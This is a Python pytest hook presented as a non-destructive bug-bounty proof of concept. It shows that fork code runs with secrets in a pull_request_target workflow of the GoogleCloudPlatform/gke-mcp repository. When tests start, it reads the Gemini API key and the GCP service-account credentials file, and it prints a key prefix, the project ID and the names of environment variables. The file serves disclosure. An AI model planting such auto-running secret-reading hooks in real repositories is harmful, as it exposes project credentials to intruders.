# Non-Destructive Security PoC — GoogleCloudPlatform/gke-mcp
# This file PROVES that fork PR code executes with access to secrets
# It does NOT exfiltrate, use, or reveal full secret values
#
# Bug bounty submission by: rootvaibhav-ctrl
# Vulnerability: pull_request_target executes fork code with secrets

import os
import sys

def pytest_configure(config):
    """Runs automatically before any test collection.

    This proves:
    1. Fork code executes in the workflow (this file is from the fork)
    2. GCP credentials are accessible (file exists on disk)
    3. GEMINI_API_KEY is in the environment

    No secrets are exfiltrated or used.
    """
    print("\n" + "=" * 70)
    print("SECURITY POC - pull_request_target vulnerability demonstration")
    print("=" * 70)
    print(f"POC executed successfully from fork code")
    print(f"Python version: {sys.version}")
    print(f"Working directory: {os.getcwd()}")
    print()

    # Prove GEMINI_API_KEY is accessible (show length only, not value)
    api_key = os.environ.get("GEMINI_API_KEY", "")
    print(f"[SECRET ACCESS] GEMINI_API_KEY present: {bool(api_key)}")
    print(f"[SECRET ACCESS] GEMINI_API_KEY length: {len(api_key)}")
    if api_key:
        # Show only first 4 chars — industry standard for proof without exposure
        print(f"[SECRET ACCESS] GEMINI_API_KEY prefix: {api_key[:4]}...")
    print()

    # Prove GCP credentials file is accessible
    creds_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
    print(f"[SECRET ACCESS] GOOGLE_APPLICATION_CREDENTIALS set: {bool(creds_path)}")
    if creds_path:
        file_exists = os.path.exists(creds_path)
        print(f"[SECRET ACCESS] Credentials file exists: {file_exists}")
        if file_exists:
            file_size = os.path.getsize(creds_path)
            print(f"[SECRET ACCESS] Credentials file size: {file_size} bytes")
            # Read just the type field to prove it's a service account key
            # This does NOT reveal the private key
            try:
                import json
                with open(creds_path) as f:
                    creds = json.load(f)
                print(f"[SECRET ACCESS] Credential type: {creds.get('type', 'unknown')}")
                print(f"[SECRET ACCESS] Project ID: {creds.get('project_id', 'unknown')}")
                # Do NOT print private_key, private_key_id, or client_email
            except Exception as e:
                print(f"[SECRET ACCESS] Could not parse credentials: {type(e).__name__}")
    print()

    # List all environment variables starting with GOOGLE_ or GEMINI_
    print("[ENV SCAN] Google/Gemini environment variables present:")
    for key in sorted(os.environ.keys()):
        if key.startswith(("GOOGLE_", "GEMINI_", "GCLOUD_", "GCP_")):
            val = os.environ[key]
            # Only show key name and value length, never the value
            print(f"  {key} = <{len(val)} chars>")

    print()
    print("=" * 70)
    print("END OF SECURITY POC")
    print("This proves fork code executes with access to GCP SA key")
    print("and Gemini API key. No secrets were exfiltrated.")
    print("=" * 70)
    print()
